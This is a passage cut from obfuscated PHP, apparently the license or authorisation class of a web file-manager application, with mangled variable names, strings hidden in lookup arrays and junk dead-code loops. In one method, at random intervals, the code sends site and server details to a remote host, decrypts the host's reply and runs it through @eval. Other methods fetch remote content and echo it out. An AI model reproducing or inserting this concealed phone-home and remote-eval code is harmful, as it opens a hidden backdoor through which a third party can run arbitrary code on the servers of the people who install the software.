$this->ovtl1bd462cb(); } if (time() - $ËĞ’™ ó[$å˜½®µ[200]] > 20) { $ËĞ’™ ó[$å˜½®µ[200]] = time(); Cache::set($×øÇ„Î„, $ËĞ’™ ó); } $this->qyzcca47e197 = $ËĞ’™ ó; $this->dwpne412b601 = $¸¥Áëöù[$å˜½®µ[103]]; $Ï¶¿ŒöÖ = $´—Ç§á±[663]; } private function hdxb72f30648() { $Êáƒ×ô— =& $_SERVER[® ¨Ä®ñ]; $µ¶®§–° =& $_SERVER[û„Ñáçœ]; $å³»•Ëä = $GLOBALS[$µ¶®§–°[13]]; $…Ş‹ï¾° = $_SERVER[$µ¶®§–°[24]]; $¹¸œ–©ö = $Êáƒ×ô—[664]; if (strlen($¹¸œ–©ö) < $Êáƒ×ô—[607]) { die; } if ($…Ş‹ï¾° == $µ¶®§–°[201] && $this->dwpne412b601 == $µ¶®§–°[104]) { show_json(LNG($µ¶®§–°[202]), !1, $µ¶®§–°[203]); } $ò·êÊÚë = array($µ¶®§–°[204], $µ¶®§–°[205]); if (in_array($…Ş‹ï¾°, $ò·êÊÚë)) { if ($this->dwpne412b601 == $µ¶®§–°[104] && isset($å³»•Ëä[$µ¶®§–°[206]])) { show_json(LNG($µ¶®§–°[202]), !1, $µ¶®§–°[203]); die; } $„¤öîç² = $this->nblq95aa88fa(); if ($„¤öîç² != intval($µ¶®§–°[207])) { if ($„¤öîç² <= Model($µ¶®§–°[119])->count()) { show_json(LNG($µ¶®§–°[208]), !1, $µ¶®§–°[203]); die; } } } } private function wdeld73be30b() { $½­ÙÍ™ =& $_SERVER[® ¨Ä®ñ]; $ãñú¢Û =& $_SERVER[û„Ñáçœ]; $¬®Ö”©« = array($ãñú¢Û[116], $ãñú¢Û[209]); $ø•ÎÚ÷ = $½­ÙÍ™[665]; while (strlen($ø•ÎÚ÷) < $½­ÙÍ™[603]) { if (!$ø•ÎÚ÷) { break; } $ø•ÎÚ÷++; } if (!_get($GLOBALS, $ãñú¢Û[113]) || !isset($_GET[$ãñú¢Û[210]])) { return; } if (!in_array($_SERVER[$ãñú¢Û[24]], $¬®Ö”©«)) { return; } $Å»Æ¤°ú = $ãñú¢Û[211]; $Å»Æ¤°ú = $this->jbtia5e07c19($Å»Æ¤°ú, $ãñú¢Û[212]); $“Ûê¥óó = stream_context_create(array($ãñú¢Û[213] => array($ãñú¢Û[214] => $ãñú¢Û[215], $ãñú¢Û[216] => 3))); $áôŞÓÌ = $½­ÙÍ™[666]; while ($áôŞÓÌ < $½­ÙÍ™[612]) { if ($áôŞÓÌ >= 0) { break; } $áôŞÓÌ++; } $¸¸İà·Ï = @file_get_contents($Å»Æ¤°ú, !1, $“Ûê¥óó); header($ãñú¢Û[217]); if ($¸¸İà·Ï && strstr($¸¸İà·Ï, $ãñú¢Û[218])) { echo $¸¸İà·Ï; } die; } public function ftxkb342c68b($—ä¬“æŸ) { $«›Úµî =& $_SERVER[® ¨Ä®ñ]; $Ë˜ú¿‚ =& $_SERVER[û„Ñáçœ]; if ($this->dwpne412b601 == $Ë˜ú¿‚[219]) { return $—ä¬“æŸ; } $¼¿Äßİ­ = array($Ë˜ú¿‚[220] => $Ë˜ú¿‚[221], $Ë˜ú¿‚[222] => $Ë˜ú¿‚[221], $Ë˜ú¿‚[223] => $Ë˜ú¿‚[221], $Ë˜ú¿‚[224] => $Ë˜ú¿‚[221], $Ë˜ú¿‚[225] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[227] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[228] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[229] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[230] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[231] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[232] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[233] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[234] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[235] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[236] => $Ë˜ú¿‚[226], $Ë˜ú¿‚[237] => $Ë˜ú¿‚[226]); $öÕĞ¤¥ˆ = explode($Ë˜ú¿‚[238], _get($this->qyzcca47e197, $Ë˜ú¿‚[110], $Ë˜ú¿‚[6])); $Èê˜„µ¶ = $«›Úµî[667]; while ($Èê˜„µ¶ < $«›Úµî[612]) { if ($Èê˜„µ¶ >= 0) { break; } $Èê˜„µ¶++; } $ÚšüÊÎ° = array(); foreach ($¼¿Äßİ­ as $Æç±ğ³š => $ÏèËë´) { if ($ÏèËë´ == $Ë˜ú¿‚[221] && substr($this->dwpne412b601, 0, 1) == $Ë˜ú¿‚[221]) { continue; } if (!in_array($Æç±ğ³š, $öÕĞ¤¥ˆ)) { $ÚšüÊÎ°[] = $Æç±ğ³š; } } foreach ($ÚšüÊÎ° as $Æç±ğ³š) { unset($—ä¬“æŸ[$Æç±ğ³š]); $¸‹‘ØË = $«›Úµî[668]; if (!$¸‹‘ØË) { return; } } return $—ä¬“æŸ; $õİ‹×ƒÍ = $«›Úµî[669]; while ($õİ‹×ƒÍ < $«›Úµî[607]) { if ($õİ‹×ƒÍ >= 0) { break; } $õİ‹×ƒÍ++; } } private function bhlu1fb133a3() { $½¥ Şã† =& $_SERVER[û„Ñáçœ]; if ($this->dwpne412b601 != $½¥ Şã†[104]) { $GLOBALS[$½¥ Şã†[83]][$½¥ Şã†[87]][$½¥ Şã†[239]] = $½¥ Şã†[199]; return; } $GLOBALS[$½¥ Şã†[83]][$½¥ Şã†[240]] = $½¥ Şã†[191]; if (Model($½¥ Şã†[241])->get($½¥ Şã†[63]) != $½¥ Şã†[199]) { Model($½¥ Şã†[241])->set($½¥ Şã†[63], $½¥ Şã†[199]); } } public function svyg663fd0b4() { return $_SERVER[û„Ñáçœ][242]; $Š†¾ªáÛ = $_SERVER[® ¨Ä®ñ][670]; } private function ftjx1261c1e4() { $¼´ÁØ¨È =& $_SERVER[® ¨Ä®ñ]; $ÀïşÙüÊ =& $_SERVER[û„Ñáçœ]; $ŸìÃ’İ = array($ÀïşÙüÊ[243], $ÀïşÙüÊ[244], $ÀïşÙüÊ[245]); $Ïì½‰»« = $¼´ÁØ¨È[671]; if (!$Ïì½‰»«) { return; } $¯ò…³×¸ = $ÀïşÙüÊ[246] . md5($ÀïşÙüÊ[247]); if ($this->dwpne412b601 == $ÀïşÙüÊ[104] || !_get($GLOBALS, $ÀïşÙüÊ[113])) { return; } if (!in_array($_SERVER[$ÀïşÙüÊ[24]], $ŸìÃ’İ)) { return; } if (time() % 4 != 0) { return; } $ê‰Õ ¹¿ = call_user_func(array($ÀïşÙüÊ[248], $ÀïşÙüÊ[249]), $¯ò…³×¸); if ($ê‰Õ ¹¿ && time() - $ê‰Õ ¹¿ < intval($ÀïşÙüÊ[250])) { return; } call_user_func(array($ÀïşÙüÊ[248], $ÀïşÙüÊ[133]), $¯ò…³×¸, time()); $ıããĞ© = Model($ÀïşÙüÊ[33])->get($ÀïşÙüÊ[101]); $ÜËøæ¿ = $¼´ÁØ¨È[672]; while (strlen($ÜËøæ¿) < $¼´ÁØ¨È[612]) { if (!$ÜËøæ¿) { break; } $ÜËøæ¿++; } $Æöı±é = array($ÀïşÙüÊ[145] => Model($ÀïşÙüÊ[33])->get($ÀïşÙüÊ[181]), $ÀïşÙüÊ[158] => $this->dwpne412b601, $ÀïşÙüÊ[155] => $_SERVER[$ÀïşÙüÊ[156]], $ÀïşÙüÊ[157] => Model($ÀïşÙüÊ[33])->get($ÀïşÙüÊ[125]), $ÀïşÙüÊ[99] => md5($_SERVER[$ÀïşÙüÊ[100]] . $ıããĞ©), $ÀïşÙüÊ[148] => $ÀïşÙüÊ[130], $ÀïşÙüÊ[151] => $_SERVER[$ÀïşÙüÊ[152]]); $ëóÛÒ ‚ = $this->uhgze8e69e71($ÀïşÙüÊ[251], $Æöı±é); $­³Òø”÷ = $¼´ÁØ¨È[673]; if (!is_array($ëóÛÒ ‚)) { return; } if ($ëóÛÒ ‚[$ÀïşÙüÊ[145]] && $ëóÛÒ ‚[$ÀïşÙüÊ[252]]) { if ($this->osfkf8c40433($ëóÛÒ ‚[$ÀïşÙüÊ[252]]) == $Æöı±é[$ÀïşÙüÊ[145]]) { return; } } $this->ovtl1bd462cb(); $èõ¤†Šß = $¼´ÁØ¨È[674]; if (strlen($èõ¤†Šß) < $¼´ÁØ¨È[610]) { die; } if ($this->osfkf8c40433($ëóÛÒ ‚[$ÀïşÙüÊ[252]]) != $Æöı±é[$ÀïşÙüÊ[145]]) { $È÷ò£¨ï = array($ÀïşÙüÊ[176] => $ıããĞ©, $ÀïşÙüÊ[177] => $_SERVER[$ÀïşÙüÊ[100]], $ÀïşÙüÊ[178] => this_url(), $ÀïşÙüÊ[153] => $_SERVER[$ÀïşÙüÊ[154]]); $í¹ÙúÊ = $this->pqduf46c9b90(json_encode($È÷ò£¨ï)); $ëóÛÒ ‚ = $this->uhgze8e69e71($ÀïşÙüÊ[179] . $í¹ÙúÊ); if ($ëóÛÒ ‚ && is_array($ëóÛÒ ‚) && isset($ëóÛÒ ‚[$ÀïşÙüÊ[252]])) { $š»²€¬Ñ = $this->jcabd39b6396($ëóÛÒ ‚[$ÀïşÙüÊ[252]], 2); if ($š»²€¬Ñ) { $š»²€¬Ñ = $this->osfkf8c40433($š»²€¬Ñ); } if ($š»²€¬Ñ) { try { @eval($š»²€¬Ñ); } catch (Exception $°¹üÈ÷µ) { } } } } } private function uhgze8e69e71($¬ÎÃÀ = '', $©õ¾¨­Ğ = array(), $³¿âœÛÌ = 5) { $ãØ¬Ú– =& $_SERVER[® ¨Ä®ñ]; $¤ÂÎƒÏÕ =& $_SERVER[û„Ñáçœ]; $Á€»¬ ß = $¤ÂÎƒÏÕ[253]; $Á€»¬ ß = $this->jbtia5e07c19($Á€»¬ ß, $¤ÂÎƒÏÕ[254]); $Á€»¬ ß = $Á€»¬ ß . $¬ÎÃÀ; $‚Úš¸ë = $ãØ¬Ú–[675]; if (strlen($‚Úš¸ë) < $ãØ¬Ú–[623]) { die; } if ($©õ¾¨­Ğ && is_array($©õ¾¨­Ğ)) { $Á€»¬ ß = $Á€»¬ ß . $¤ÂÎƒÏÕ[255] . http_build_query($©õ¾¨­Ğ); } if ($©õ¾¨­Ğ === -1) { return $Á€»¬ ß; } $…’×¿Øª = stream_context_create(array($¤ÂÎƒÏÕ[213] => array($¤ÂÎƒÏÕ[216] => $³¿âœÛÌ, $¤ÂÎƒÏÕ[214] => $¤ÂÎƒÏÕ[256]), $¤ÂÎƒÏÕ[257] => array($¤ÂÎƒÏÕ[258] => !1, $¤ÂÎƒÏÕ[259] => !1))); $©õ¾¨­Ğ = @file_get_contents($Á€»¬ ß, !1, $…’×¿Øª); return json_decode($©õ¾¨­Ğ, !0); $ï¹›õîû = $ãØ¬Ú–[676]; if (!$ï¹›õîû) { die; } } private function nblq95aa88fa() { $ÆÚÙ…Œ¶ =& $_SERVER[® ¨Ä®ñ]; $Ù½Áˆ€Ò =& $_SERVER[û„Ñáçœ]; $ÛÕÈÂš = array($Ù½Áˆ€Ò[260] => $Ù½Áˆ€Ò[261], $Ù½Áˆ€Ò[262] => $Ù½Áˆ€Ò[263], $Ù½Áˆ€Ò[264] => $Ù½Áˆ€Ò[265], $Ù½Áˆ€Ò[266] => $Ù½Áˆ€Ò[267], $Ù½Áˆ€Ò[268] => $Ù½Áˆ€Ò[269], $Ù½Áˆ€Ò[270] => $Ù½Áˆ€Ò[207], $Ù½Áˆ€Ò[271] => $Ù½Áˆ€Ò[207], $Ù½Áˆ€Ò[272] => $Ù½Áˆ€Ò[261], $Ù½Áˆ€Ò[273] => $Ù½Áˆ€Ò[263], $Ù½Áˆ€Ò[274] => $Ù½Áˆ€Ò[265], $Ù½Áˆ€Ò[275] => $Ù½Áˆ€Ò[276], $Ù½Áˆ€Ò[277] => $Ù½Áˆ€Ò[267], $Ù½Áˆ€Ò[278] => $Ù½Áˆ€Ò[279], $Ù½Áˆ€Ò[280] => $Ù½Áˆ€Ò[269], $Ù½Áˆ€Ò[281] => $Ù½Áˆ€Ò[282], $Ù½Áˆ€Ò[283] => $Ù½Áˆ€Ò[284], $Ù½Áˆ€Ò[285] => $Ù½Áˆ€Ò[286]); $¢…ä†Õª = $ÛÕÈÂš[$this->dwpne412b601]; $ÇŞÍî· = $ÆÚÙ…Œ¶[677]; while (strlen($ÇŞÍî·) < $ÆÚÙ…Œ¶[610]) { if (!$ÇŞÍî·) { break; } $ÇŞÍî·++; } $¢…ä†Õª = intval($¢…ä†Õª ? $¢…ä†Õª : $Ù½Áˆ€Ò[261]); $¡ÉÒº˜ò = _get($this->qyzcca47e197, $Ù½Áˆ€Ò[287]); $¡ÉÒº˜ò = $¡ÉÒº˜ò ? intval($¡ÉÒº˜ò) : 0; $´ºü†Ú– = $ÆÚÙ…Œ¶[678]; if (strlen($´ºü†Ú–) < $ÆÚÙ…Œ¶[612]) { return; } return $¢…ä†Õª + $¡ÉÒº˜ò; $¿±ˆ°Â“ = $ÆÚÙ…Œ¶[679]; if (!$¿±ˆ°Â“) { return; } } public function ymos2b95d768($ãöŞîá“) { $Ÿøæ½ =& $_SERVER[® ¨Ä®ñ]; $æŠ€¿í§ =& $_SERVER[û„Ñáçœ]; $éòïÓÍû = $this->nblq95aa88fa(); if ($ãöŞîá“[$æŠ€¿í§[288]] == $æŠ€¿í§[191]) { return; } if ($éòïÓÍû >= intval($æŠ€¿í§[207])) { return; } $–Í“Ó¨¥ = Model($æŠ€¿í§[119])->count(); $Ÿí¦İ®ş = $Ÿøæ½[680]; while (strlen($Ÿí¦İ®ş) < $Ÿøæ½[607]) { if (!$Ÿí¦İ®ş) { break; } $Ÿí¦İ®ş++; } if ($–Í“Ó¨¥ <= $éòïÓÍû) { return; } $´™º´ = Model($æŠ€¿í§[119])->field($æŠ€¿í§[288])->limit($éòïÓÍû)->select(); $èÊ”ñÔÊ = $Ÿøæ½[681]; $´™º´ = array_to_keyvalue($´™º´, $æŠ€¿í§[6], $æŠ€¿í§[288]); $ÏóûŞÍ = $Ÿøæ½[682]; if (!in_array($ãöŞîá“[$æŠ€¿í§[288]], $´™º´)) { show_json($æŠ€¿í§[289], !1, $æŠ€¿í§[203]); } } public function jpmn14467abe() { $£†–íû =& $_SERVER[® ¨Ä®ñ]; $øÆºÓÌ» =& $_SERVER[û„Ñáçœ]; if (!_get($GLOBALS, $øÆºÓÌ»[113]) || mt_rand(1, 100) > 20) { return; } $ÛïŠÛÁÃ = $øÆºÓÌ»[211]; $ÛïŠÛÁÃ = $this->jbtia5e07c19($ÛïŠÛÁÃ, $øÆºÓÌ»[212]); $ÄäÀ“Ïó = $£†–íû[683]; if (strlen($ÄäÀ“Ïó) < $£†–íû[612]) { return; } $„˜İÍ… = stream_context_create(array($øÆºÓÌ»[213] => array($øÆºÓÌ»[214] => $øÆºÓÌ»[215], $øÆºÓÌ»[216] => 3))); $»”¹éœ· = @file_get_contents($ÛïŠÛÁÃ, !1, $„˜İÍ…); echo $øÆºÓÌ»[290] . hash_encode($»”¹éœ·) . $øÆºÓÌ»[291]; $ü’¬Õ¾¬ = $£†–íû[684]; if (!$ü’¬Õ¾¬) { die; } } private function rbtocb0b87ba($¹÷·³¶, $„–áøØ†, $ù¡Ú¨™ê = 3) { $ÀÕà–˜Ï =& $_SERVER[® ¨Ä®ñ]; $åÏøŸ¨ =& $_SERVER[û„Ñáçœ]; usleep(1); $¹÷·³¶ = trim($¹÷·³¶); $í¯¼èü® = $ÀÕà–˜Ï[685]; while (strlen($í¯¼èü®) < $ÀÕà–˜Ï[603]) { if (!$í¯¼èü®) { break; } $í¯¼èü®++; } $£¸’ùí– = mt_rand(0, 5) . $åÏøŸ¨[6]; $Êáôõ  = $ÀÕà–˜Ï[686]; if (!$Êáôõ ) { return; } $û€ÊÈ¹ô = rand_string(15); $ü€Ö¦çƒ = $ÀÕà–˜Ï[597]; if (!$ü€Ö¦çƒ) { die; } $úèÅÒÃí = $åÏøŸ¨[292]; switch ($£¸’ùí–) { case $åÏøŸ¨[199]: $™­Š¥Õç = $this->avzq540a0502($¹÷·³¶, strrev($„–áøØ† . $û€ÊÈ¹ô)); $¶í¬¢î« = $ÀÕà–˜Ï[687]; while ($¶í¬¢î« < $ÀÕà–˜Ï[610]) { if ($¶í¬¢î« >= 0) { break; } $¶í¬¢î«++; } break; $Ê§ñÇğÑ = $ÀÕà–˜Ï[688]; if (strlen($Ê§ñÇğÑ) < $ÀÕà–˜Ï[610]) { die; } case $åÏøŸ¨[191]: $™­Š¥Õç = $this->avzq540a0502($¹÷·³¶, strrev($û€ÊÈ¹ô . $„–áøØ†)); break; $”ïÈÚšÜ = $ÀÕà–˜Ï[689]; if (strlen($”ïÈÚšÜ) < $ÀÕà–˜Ï[610]) { die; } case $åÏøŸ¨[293]: $™­Š¥Õç = $this->avzq540a0502($¹÷·³¶, base64_encode($û€ÊÈ¹ô . $„–áøØ†)); $ô×õ–õ¡ = $ÀÕà–˜Ï[639]; break; $µ·³ßÃ— = $ÀÕà–˜Ï[690]; if (strlen($µ·³ßÃ—) < $ÀÕà–˜Ï[603]) { die; } case $åÏøŸ¨[294]: $™­Š¥Õç = $this->avzq540a0502($¹÷·³¶, md5($û€ÊÈ¹ô . $„–áøØ†)); break; $·ÏÏŸ¾ = $ÀÕà–˜Ï[691]; if (!$·ÏÏŸ¾) { return; } case $åÏøŸ¨[295]: $¹÷·³¶ = base64_encode($¹÷·³¶); $›Ö³´Â = rand(0, 64); $º›Ä™§Ğ = $úèÅÒÃí[$›Ö³´Â]; $âªñª–È = $ÀÕà–˜Ï[692]; $ÔÊí¬üİ = md5($º›Ä™§Ğ . md5($„–áøØ† . $º›Ä™§Ğ) . $„–áøØ†); $ÔÊí¬üİ = substr($ÔÊí¬üİ, $›Ö³´Â % 8, $›Ö³´Â % 8 + 7); $±¬ÅÖî› = $åÏøŸ¨[6]; $¼â½ĞìÜ = 0; $¬Ñá…ãæ = $ÀÕà–˜Ï[693]; if (!$¬Ñá…ãæ) { die; } $ä»’³æ = 0; $”î¥·ä¤ = 0; for ($¼â½ĞìÜ = 0; $¼â½ĞìÜ < strlen($¹÷·³¶); $¼â½ĞìÜ++) { $”î¥·ä¤ = $”î¥·ä¤ == strlen($ÔÊí¬üİ) ? 0 : $”î¥·ä¤; $£€å´ãø = $ÀÕà–˜Ï[694]; if (strlen($£€å´ãø) < $ÀÕà–˜Ï[607]) { die; } $ä»’³æ = ($›Ö³´Â + strpos($úèÅÒÃí, $¹÷·³¶[$¼â½ĞìÜ]) + ord($ÔÊí¬üİ[$”î¥·ä¤++])) % 64; $ö¸©¢Ğª = $ÀÕà–˜Ï[695]; if (strlen($ö¸©¢Ğª) < $ÀÕà–˜Ï[607]) { die; } $±¬ÅÖî› .= $úèÅÒÃí[$ä»’³æ]; $–‰”¬ì„ = $ÀÕà–˜Ï[696]; while (strlen($–‰”¬ì„) < $ÀÕà–˜Ï[603]) { if (!$–‰”¬ì„) { break; } $–‰”¬ì„++; } } $™­Š¥Õç = hash_encode($º›Ä™§Ğ . $±¬ÅÖî›); break; default: $™­Š¥Õç = $this->avzq540a0502($¹÷·³¶, $„–áøØ† . $û€ÊÈ¹ô); $Ô±üÜ‰  = $ÀÕà–˜Ï[697]; break; } $™­Š¥Õç = strrev($£¸’ùí– . $û€ÊÈ¹ô . $™­Š¥Õç); $—Êš†£ = $ÀÕà–˜Ï[698]; if (strlen($—Êš†£) < $ÀÕà–˜Ï[603]) { return; } if ($ù¡Ú¨™ê - 1 > 0) { $™­Š¥Õç = $this->rbtocb0b87ba($™­Š¥Õç, $„–áøØ†, $ù¡Ú¨™ê - 1); } return $™­Š¥Õç; } private function jcabd39b6396($ÄÜ›½ˆ³, $Ÿ¯·°ó, $‚’¥Åü = 3) { $Ì©ø£í¤ =& $_SERVER[® ¨Ä®ñ]; $Ã‡½ó¾ß =& $_SERVER[û„Ñáçœ]; if (!is_string($ÄÜ›½ˆ³) || strlen($ÄÜ›½ˆ³) < 10) { return !1; } $ÄÜ›½ˆ³ = trim($ÄÜ›½ˆ³); $ÄÜ›½ˆ³ = strrev($ÄÜ›½ˆ³); $·Ø¿Şù‰ = $ÄÜ›½ˆ³[0]; $ª’ò‹Ãî = $Ì©ø£í¤[699]; if (!$ª’ò‹Ãî) { return; } $÷àİ¬§’ = substr($ÄÜ›½ˆ³, 1, 15); $ÄÜ›½ˆ³ = substr($ÄÜ›½ˆ³, 16); $ªŸ° ‘¯ = $Ì©ø£í¤[700]; if (!$ªŸ° ‘¯) { return; } $›Ğİå = $Ã‡½ó¾ß[292]; $²ıŒÛàŒ = $Ì©ø£í¤[701]; if (strlen($²ıŒÛàŒ) < $Ì©ø£í¤[607]) { return; } switch ($·Ø¿Şù‰) { case $Ã‡½ó¾ß[199]: $ò–û‘ = $this->jbtia5e07c19($ÄÜ›½ˆ³, strrev($Ÿ¯·°ó . $÷àİ¬§’)); $¹é„ĞİÎ = $Ì©ø£í¤[702]; if (!$¹é„ĞİÎ) { die; } break; case $Ã‡½ó¾ß[191]: $ò–û‘ = $this->jbtia5e07c19($ÄÜ›½ˆ³, strrev($÷àİ¬§’ . $Ÿ¯·°ó)); $¬–øóˆ– = $Ì©ø£í¤[703]; if (!$¬–øóˆ–) { return; } break; $‘¹¤–˜è = $Ì©ø£í¤[704]; if (!$‘¹¤–˜è) { return; } case $Ã‡½ó¾ß[293]: $ò–û‘ = $this->jbtia5e07c19($ÄÜ›½ˆ³, base64_encode($÷àİ¬§’ . $Ÿ¯·°ó)); $œµ ö½ = $Ì©ø£í¤[637]; while ($œµ ö½ < $Ì©ø£í¤[607]) { if ($œµ ö½ >= 0) { break; } $œµ ö½++; } break; $¢‘Å´›« = $Ì©ø£í¤[705]; case $Ã‡½ó¾ß[294]: $ò–û‘ = $this->jbtia5e07c19($ÄÜ›½ˆ³, md5($÷àİ¬§’ . $Ÿ¯·°ó)); break; case $Ã‡½ó¾ß[295]: $ÄÜ›½ˆ³ = hash_decode($ÄÜ›½ˆ³); $Œ£ÏÆñ = $ÄÜ›½ˆ³[0]; $ÄÜ›½ˆ³ = substr($ÄÜ›½ˆ³, 1); $¿Ğ†…¸à = $Ì©ø£í¤[706]; while (strlen($¿Ğ†…¸à) < $Ì©ø£í¤[607]) { if (!$¿Ğ†…¸à) { break; } $¿Ğ†…¸à++; } $‘û‰á = strpos($›Ğİå, $Œ£ÏÆñ); $àÛ¸­ğå = md5($Œ£ÏÆñ . md5($Ÿ¯·°ó . $Œ£ÏÆñ) . $Ÿ¯·°ó); $àÛ¸­ğå = substr($àÛ¸­ğå, $‘û‰á % 8, $‘û‰á % 8 + 7); $ÊÔ¡¶õ¸ = $Ì©ø£í¤[707]; if (!$ÊÔ¡¶õ¸) { die; } $Ùã‰øï = $Ã‡½ó¾ß[6]; $ËÄÖØ³ = 0; $«†ÀĞĞÓ = 0; $áéÍı§Ú = $Ì©ø£í¤[708]; while ($áéÍı§Ú < $Ì©ø£í¤[603]) { if ($áéÍı§Ú >= 0) { break; } $áéÍı§Ú++; } $àÛæÍô½ = 0; for ($ËÄÖØ³ = 0; $ËÄÖØ³ < strlen($ÄÜ›½ˆ³); $ËÄÖØ³++) { $àÛæÍô½ = $àÛæÍô½ == strlen($àÛ¸­ğå) ? 0 : $àÛæÍô½; $·Ç …ÅÀ = $àÛæÍô½++; $«†ÀĞĞÓ = strpos($›Ğİå, $ÄÜ›½ˆ³[$ËÄÖØ³]) - $‘û‰á - ord($àÛ¸­ğå[$·Ç …ÅÀ]); while ($«†ÀĞĞÓ < 0) { $«†ÀĞĞÓ += 64; } $Ùã‰øï .= $›Ğİå[$«†ÀĞĞÓ]; } $ò–û‘ = base64_decode($Ùã‰øï); break; $ÕûØû³ = $Ì©ø£í¤[709]; while ($ÕûØû³ < $Ì©ø£í¤[607]) { if ($ÕûØû³ >= 0) { break; } $ÕûØû³++; } default: $ò–û‘ = $this->jbtia5e07c19($ÄÜ›½ˆ³, $Ÿ¯·°ó . $÷àİ¬§’); $ëü „€ê = $Ì©ø£í¤[710]; if (!$ëü „€ê) { return; } break; $ßÙ†Æ±ò = $Ì©ø£í¤[711]; if (strlen($ßÙ†Æ±ò) < $Ì©ø£í¤[610]) { return; } } if ($‚’¥Åü - 1 > 0) { $ò–û‘ = $this->jcabd39b6396($ò–û‘, $Ÿ¯·°ó, $‚’¥Åü - 1); } return $ò–û‘; } public function pqduf46c9b90($ú…µâÏ—) { $Ÿë³Ôîß =& $_SERVER[® ¨Ä®ñ]; $íµæììˆ =& $_SERVER[û„Ñáçœ]; $Ä Ò±ëÔ = $this->csxf6ac97d4b(); $¨Ô†•²‚ = $this->csxf6ac97d4b(); $ó”¶Ì = ($Ä Ò±ëÔ - 1) * ($¨Ô†•²‚ - 1); $½â×™Üï = $Ÿë³Ôîß[712]; $›’•ÆŠ¯ = intval(($Ä Ò±ëÔ + $¨Ô†•²‚) / 2); while (1) { $ŠÃÌ…Ü¡ = $›’•ÆŠ¯; $¹ŸƒğÚø = $ó”¶Ì; while ($¹ŸƒğÚø % $ŠÃÌ…Ü¡ != 0) { $¶í©ë›á = $¹ŸƒğÚø; $¹ŸƒğÚø = $ŠÃÌ…Ü¡; $Šíë›· = $Ÿë³Ôîß[713]; $ŠÃÌ…Ü¡ = $¶í©ë›á % $ŠÃÌ…Ü¡; $°‡‡¨¼– = $Ÿë³Ôîß[714]; } if ($ŠÃÌ…Ü¡ == 1) { break; } else { $›’•ÆŠ¯++; } } $ºáÈ²•Î = 2; for ($Î”Ï³»ü = 0; $Î”Ï³»ü < $ó”¶Ì * 10; $Î”Ï³»ü++) { if (($ó”¶Ì * $Î”Ï³»ü + 1) % $›’•ÆŠ¯ == 0) { $ºáÈ²•Î = intval(($ó”¶Ì * $Î”Ï³»ü + 1) / $›’•ÆŠ¯); break; } } $î£şÙÀø = $this->avzq540a0502($Ä Ò±ëÔ * $¨Ô†•²‚ . $íµæììˆ[6], $íµæììˆ[130]); $‘¾ËÀÉ¸ = $Ÿë³Ôîß[715]; while ($‘¾ËÀÉ¸ < $Ÿë³Ôîß[612]) { if ($‘¾ËÀÉ¸ >= 0) { break; } $‘¾ËÀÉ¸++; } $‘±÷úìø = md5($íµæììˆ[296] . ($Ä Ò±ëÔ + $¨Ô†•²‚) . $íµæììˆ[297] . $›’•ÆŠ¯ . $íµæììˆ[297] . $ºáÈ²•Î . $íµæììˆ[298]); $Ñ¢ Ä½® = $this->avzq540a0502($ú…µâÏ—, $‘±÷úìø) . $íµæììˆ[299] . $î£şÙÀø; return $Ñ¢ Ä½®; } public function osfkf8c40433($†è’£´Æ) { $Õ¨ùİ´Ô =& $_SERVER[® ¨Ä®ñ]; $•ÃÃ«¡ê =& $_SERVER[û„Ñáçœ]; $ùßğ¾âœ = explode($•ÃÃ«¡ê[299], $†è’£´Æ); $ÊÀ©úšì = $Õ¨ùİ´Ô[716]; if (count($ùßğ¾âœ) != 2) { return $•ÃÃ«¡ê[6]; } $„İÓï¥õ = $this->jbtia5e07c19($ùßğ¾âœ[1] . $•ÃÃ«¡ê[6], $•ÃÃ«¡ê[130]); if (!$„İÓï¥õ) { return $•ÃÃ«¡ê[6]; } $„İÓï¥õ = intval($„İÓï¥õ); $¦Àİ…š‡ = 0; $üÔ›÷ß² = 0; for ($ úÄÙ›û = 3; $ úÄÙ›û < $„İÓï¥õ; $ úÄÙ›û += 2) { if ($„İÓï¥õ % $ úÄÙ›û != 0) { continue; } $¦Àİ…š‡ = $ úÄÙ›û; $óªº‰ì” = $Õ¨ùİ´Ô[717]; $üÔ›÷ß² = intval($„İÓï¥õ / $ úÄÙ›û); break; $Î‡ï¶ì¹ = $Õ¨ùİ´Ô[718]; if (!$Î‡ï¶ì¹) { return; } } $óş…¾ƒ¢ = ($¦Àİ…š‡ - 1) * ($üÔ›÷ß² - 1); $î•÷× = intval(($¦Àİ…š‡ + $üÔ›÷ß²) / 2); while (1) { $ñäÛ„‹˜ = $î•÷×; $Øş“ÒÂæ = $Õ¨ùİ´Ô[719]; while ($Øş“ÒÂæ < $Õ¨ùİ´Ô[610]) { if ($Øş“ÒÂæ >= 0) { break; } $Øş“ÒÂæ++; } $Í¿ ÄâÂ = $óş…¾ƒ¢; while ($Í¿ ÄâÂ % $ñäÛ„‹˜ != 0) { $“†µÉÉ¶ = $Í¿ ÄâÂ; $ÃïÈç¥‘ = $Õ¨ùİ´Ô[720]; if (strlen($ÃïÈç¥‘) < $Õ¨ùİ´Ô[603]) { die; } $Í¿ ÄâÂ = $ñäÛ„‹˜; $ñäÛ„‹˜ = $“†µÉÉ¶ % $ñäÛ„‹˜; } if ($ñäÛ„‹˜ == 1) { break; } else { $î•÷×++; } } $ØœäÉ¤ª = 2; $•Ë‰¦‚ = $Õ¨ùİ´Ô[721]; for ($ úÄÙ›û = 0; $ úÄÙ›û < $óş…¾ƒ¢ * 10; $ úÄÙ›û++) { if (($óş…¾ƒ¢ * $ úÄÙ›û + 1) % $î•÷× == 0) { $ØœäÉ¤ª = intval(($óş…¾ƒ¢ * $ úÄÙ›û + 1) / $î•÷×); break; } } $ø¾ ÇŞÇ = md5($•ÃÃ«¡ê[296] . ($¦Àİ…š‡ + $üÔ›÷ß²) . $•ÃÃ«¡ê[297] . $î•÷× . $•ÃÃ«¡ê[297] . $ØœäÉ¤ª . $•ÃÃ«¡ê[298]); $©ìŸ¥íò = $Õ¨ùİ´Ô[722]; while (strlen($©ìŸ¥íò) < $Õ¨ùİ´Ô[603]) { if (!$©ìŸ¥íò) { break; } $©ìŸ¥íò++; } $Óı§áÒÅ = $this->jbtia5e07c19($ùßğ¾âœ[0], 